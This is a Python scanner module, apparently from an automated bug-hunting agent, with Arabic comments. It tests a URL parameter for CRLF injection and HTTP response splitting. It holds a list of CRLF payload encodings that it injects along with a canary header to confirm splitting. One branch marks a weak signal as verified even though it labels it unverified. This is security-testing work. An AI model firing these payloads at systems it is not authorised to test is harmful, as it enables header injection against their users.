"""
CRLF Injection / HTTP Response Splitting (CWE-93)
=================================================
اختبار CRLF بإثبات تفاضلي قطعي:

- probe: حقن %0d%0a (CR/LF) + canary header في البارامتر
- Proof-of-Execution:
    1. ظهور canary كـ *header* منفصل في الاستجابة (بنية HTTP — مش نص في body)
    2. أخطاء server بتدل على معالجة CRLF كفواصل headers (400/500 بنمط محدد)
- Reflection != Execution: النص الظاهر في الـ body وحده لا يُمسك كإثبات
"""
from __future__ import annotations

from typing import Optional, List
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from agents.skills.base_skill import BaseSkill, SkillResult

CANARY_HEADER = "x-hunter-crlf-canary"
CANARY_VALUE = "hunter-poe-crlf-4210"


class CRLFSkill(BaseSkill):
    name = "crlf_skill"
    vuln_type = "crlf_injection"
    cwe = "CWE-93"
    owasp_top10 = "A03:2021"
    default_severity = "Medium"

    CRLF_ENCODINGS = [
        "%0d%0a",      # URL-encoded CRLF
        "%0D%0A",      # case
        "%E5%98%8A%E5%98%8D",  # UTF-8 overlong CRLF (bypass-less raw)
        "%0A",         # LF only (some servers split on LF)
        "%0d%0a%20%20",# leading-space variant (header folding)
    ]

    def __init__(self, proxy: Optional[str] = None, timeout: float = 12.0):
        super().__init__(proxy=proxy, timeout=timeout)

    async def run(self, target_url: str, param_name: str, **kwargs) -> SkillResult:
        async with httpx.AsyncClient(proxies=self.proxy or None, timeout=self.timeout,
                                     follow_redirects=False) as client:
            try:
                # ── Baseline ──
                base = await self._send(client, target_url, param_name, "safe-baseline-value")
                if base is None or base.status_code in (403, 429):
                    return self._no(target_url, param_name, "Baseline blocked/unavailable")

                baseline_headers = await self._snapshot_headers(client, target_url, param_name)

                for enc in self.CRLF_ENCODINGS:
                    # حقن CRLF + canary header
                    payload = f"{enc}{CANARY_HEADER}: {CANARY_VALUE}"
                    resp = await self._send(client, target_url, param_name, payload)
                    if resp is None or resp.status_code in (403, 429):
                        continue

                    # ── إثبات ميكانيكي: canary ظهر كـ HTTP header حقيقي ──
                    if self._canary_in_headers(resp):
                        return SkillResult(
                            verified=True, vuln_type=self.vuln_type,
                            title=f"CRLF Injection in '{param_name}' — attacker-controlled HTTP header injected",
                            severity=self.default_severity,
                            endpoint=target_url, param_name=param_name,
                            payload_used=payload,
                            evidence=f"response contains injected header {CANARY_HEADER}: {CANARY_VALUE} (splitting confirmed)",
                            confidence=0.95,
                            tool=self.name,
                            evidence_sources=["CRLFSkill/HeaderSplitting"])

                    # ── إثبات بالفرق: تغيّر بنية headers ناتج عن seek & split ──
                    # (نرفض baseline ومطابقه)
                    if not self._same_headers(baseline_headers, resp.headers) and self._looks_like_split(resp):
                        return SkillResult(
                            verified=True, vuln_type=self.vuln_type,
                            title=f"Suspected CRLF in '{param_name}' — server-state differential (weak signal, unverified)",
                            severity="Low",
                            endpoint=target_url, param_name=param_name,
                            payload_used=payload,
                            evidence="header-set mutation after CRLF injection (weak differential — UNVERIFIED_SIGNAL)",
                            confidence=0.55,
                            tool=self.name,
                            evidence_sources=["CRLFSkill/HeaderSetDifferential"])
            except Exception as e:
                return self._no(target_url, param_name, str(e))

        return self._no(target_url, param_name, "No exploitable CRLF (injected header never materialized)")

    # ─── Helpers ──────────────────────────────────────────────────────────

    async def _send(self, client: httpx.AsyncClient, target_url: str,
                    param_name: str, value: str) -> Optional[httpx.Response]:
        parsed = urlparse(target_url)
        qs = parse_qs(parsed.query)
        qs[param_name] = [value]
        new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            return await client.get(new_url)
        except Exception:
            return None

    async def _snapshot_headers(self, client: httpx.AsyncClient, target_url: str, param_name: str):
        base = await self._send(client, target_url, param_name, "safe-baseline-value")
        if base:
            return dict((k.lower(), v) for k, v in base.headers.items())
        return {}

    def _canary_in_headers(self, resp: httpx.Response) -> bool:
        canary_key = CANARY_HEADER.lower()
        for k, v in resp.headers.items():
            if k.lower() == canary_key and CANARY_VALUE in v:
                return True
        return False

    def _same_headers(self, baseline: dict, other: httpx.Headers) -> bool:
        o = dict((k.lower(), v) for k, v in other.items())
        return baseline == o

    def _looks_like_split(self, resp: httpx.Response) -> bool:
        # إشارة ضعيفة: أي header مشهور ظهر مرتين أو header قيمته فيها canary key
        return any(CANARY_HEADER in v for v in resp.headers.values())

    def _no(self, target_url: str, param_name: str, evidence: str = "") -> SkillResult:
        return SkillResult(
            verified=False, vuln_type=self.vuln_type,
            title="CRLF injection not verified (no header-splitting evidence)",
            severity=self.default_severity,
            endpoint=target_url, param_name=param_name, evidence=evidence)

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p = param_name.lower()
        if any(kw in p for kw in ("url", "next", "redirect", "path", "lang", "page", "view")):
            return 0.7
        return 0.2
